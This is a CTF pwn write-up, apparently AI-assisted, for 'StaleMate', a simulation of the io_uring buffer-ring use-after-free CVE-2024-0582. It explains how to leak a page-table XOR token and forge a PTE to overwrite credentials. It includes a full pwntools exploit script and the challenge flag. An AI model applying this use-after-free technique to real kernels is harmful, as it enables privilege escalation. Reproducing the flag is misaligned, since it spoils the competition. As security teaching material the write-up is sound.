---
title: "StaleMate"
date: "2026-06-28"
author: "tungdlm99"
ctf: "V1t CTF 2026"
category: pwn
difficulty: hard
points: 0
flag_format: "v1t{...}"
tags: [ctf, v1t-ctf-2026, pwn, ai-assisted]
draft: false
summary: "A userland re-implementation of io_uring provided buffer rings models CVE-2024-0582: unregister a mmap'd PBUF ring and the stale mapping becomes a UAF read/write you ride to forge a page-table PTE onto the cred slot."
icon: "♟️"
---

## Summary
`pbuf_remap` is a userland simulation of the Linux io_uring "provided buffer ring" (PBUF) subsystem that faithfully reproduces CVE-2024-0582: registering a ring, `mmap`ing it, then unregistering it frees the backing buddy block but leaves the mapping live, giving a use-after-free. The "stalemate" is that the privileged `cred` is built one move from valid (its hash is already correct), so the UAF only needs to fix three fields — which it does by leaking the page-table XOR token through the stale mapping and forging a PTE onto the cred slot.

## Solution
My role here was direction and judgment; the model did the reversing and scripting grind. I recognized the banner ("tiny io_uring lab", "your mapped pbuf ring is definitely gone") as a deliberate CVE-2024-0582 reenactment, so I pointed the model at the register/mmap/unregister lifecycle from the start rather than letting it wander the whole menu.

1. **Triage and find the win condition.** I had the model reverse the stripped PIE and isolate option 10 (`open flag`). It recovered the cred check at slot `0x7440 + [0x5010]*0x1000`: it wants `cred[0]=="CREDv1"`, `cred[8]==0`, `cred[0x10]==0`, `cred[0x18]==-1`, and `cred[0x20]==splitmix64(0xc0ffee20240582 ^ secret)`. The model's first instinct was to chase the random `secret` to compute the hash — I caught that detour and pointed out the boot routine already writes the *correct* hash into `cred[0x20]`. That is the stalemate: only `cred[8]`, `cred[0x10]`, `cred[0x18]` are wrong, so we just need a write primitive, never a secret leak.

2. **Build the UAF, then verify the overlap.** I steered the model through the bug lifecycle: option 1 registers a ring (buddy-allocates slot S), option 2 `mmap`s it, option 3 unregisters (frees block S but keeps the mapping = the stale move). Then option 6 (`create mm context`) reuses freed slot S for the page holding the SLOT7 PTE, so the stale mapping now overlaps a page table. I asked it to confirm via option 5 (`inspect`, idx 3) that the leaked 16-byte entry was in fact the SLOT7 PTE before trusting it.

3. **Forge the PTE.** PTEs are `(phys_slot<<12 | flags) XOR token` — a plain XOR, not a keyed MAC. Since the scratch slot is the known constant 3, `token = leaked ^ ((3<<12)|7)`, and a PTE pointing at the cred slot (index 1) is `((1<<12)|7) ^ token`. The model wrote that forged PTE through the stale mapping (option 4), then used `vm write` to zero `cred[8]`/`cred[0x10]` and set `cred[0x18]=-1`. I verified each step's primitive before chaining. Option 10 then prints the flag. The remote also gates the menu behind a redpwn-style PoW, solved client-side.

```python
#!/usr/bin/env python3
# StaleMate (V1t CTF 2026) — io_uring PBUF stale-mmap UAF (CVE-2024-0582 model)
# usage: python3 expl.py remote   (nc pwn.v1t.site 31337)
import sys
from pwn import remote, process

HOST, PORT = "pwn.v1t.site", 31337

def solve_pow(chal):
    # redpwn-style: "s.<d>.<x>"  ->  x = pow(x, 1<<1277, (1<<1279)-1) ^ 1, d times
    _, d, x = chal.strip().split(".")
    d, x, mod = int(d), int(x), (1 << 1279) - 1
    for _ in range(d):
        x = pow(x, 1 << 1277, mod) ^ 1
    return str(x)

io = remote(HOST, PORT) if (len(sys.argv) > 1 and sys.argv[1] == "remote") else process("./pbuf_remap")

# proof-of-work gate (remote only)
line = io.recvline().decode()
if line.startswith("s."):
    io.sendlineafter(b"solution: ", solve_pow(line).encode())

def menu(opt):
    io.sendlineafter(b"> ", str(opt).encode())

def reg(bgid, entries, flags):           # option 1
    menu(1); io.sendlineafter(b"bgid: ", str(bgid).encode())
    io.sendlineafter(b"entries: ", str(entries).encode())
    io.sendlineafter(b"flags: ", str(flags).encode())

def mmap_ring(bgid):                      # option 2
    menu(2); io.sendlineafter(b"bgid: ", str(bgid).encode())

def unreg(bgid):                          # option 3
    menu(3); io.sendlineafter(b"bgid: ", str(bgid).encode())

def buf_ring_add(m, idx, addr, ln, bid, resv):   # option 4 (UAF write)
    menu(4)
    io.sendlineafter(b"map: ",  str(m).encode())
    io.sendlineafter(b"idx: ",  str(idx).encode())
    io.sendlineafter(b"addr: ", str(addr).encode())
    io.sendlineafter(b"len: ",  str(ln).encode())
    io.sendlineafter(b"bid: ",  str(bid).encode())
    io.sendlineafter(b"resv: ", str(resv).encode())

def inspect(m, idx):                      # option 5 (UAF read) -> 16-byte entry
    menu(5)
    io.sendlineafter(b"map: ", str(m).encode())
    io.sendlineafter(b"idx: ", str(idx).encode())
    vals = {}
    for k in (b"addr", b"len", b"bid", b"resv"):
        io.recvuntil(k + b"="); vals[k.decode()] = int(io.recvline().strip(), 0)
    return vals

def mm_ctx():                             # option 6 -> reuses freed slot
    menu(6)

def vm_write(vm, va, data):              # option 9
    menu(9)
    io.sendlineafter(b"vm: ",  str(vm).encode())
    io.sendlineafter(b"va: ",  str(va).encode())
    io.sendlineafter(b"len: ", str(len(data)).encode())
    io.sendafter(b"data: ", data)

# 1) register -> 2) mmap -> 3) unregister  ==> stale mapping over freed slot
reg(bgid=1, entries=256, flags=1)
mmap_ring(bgid=1)
unreg(bgid=1)

# 4) mm context reuses the freed slot for the page holding SLOT7 PTE
mm_ctx()

# 5) leak SLOT7 PTE through the stale mapping (entry idx 3)
e = inspect(m=0, idx=3)
slot7 = (e["len"] & 0xffffffff) | (e["bid"] << 32) | (e["resv"] << 48)
token = slot7 ^ ((3 << 12) | 7)          # scratch slot is the known constant 3

# 6) forge a PTE mapping the cred slot (index 1); write it via the stale mapping
forged = ((1 << 12) | 7) ^ token
buf_ring_add(m=0, idx=1, addr=forged, ln=0, bid=0, resv=0)

# 7) vm write to the cred page: cred[8]=0, cred[0x10]=0, cred[0x18]=-1
vm_write(vm=0, va=0x2008, data=b"\x00" * 16 + b"\xff" * 8)

# 8) open flag -> check now passes
menu(10)
io.interactive()
```

The flag itself spells out the root cause: the PFN-mapped PBUF pages must outlive the `mmap` — unregistering while the ring is still mapped is exactly the UAF in CVE-2024-0582.

## Flag
```
v1t{pfnmap_pbuf_pages_should_outlive_the_mmap}
```
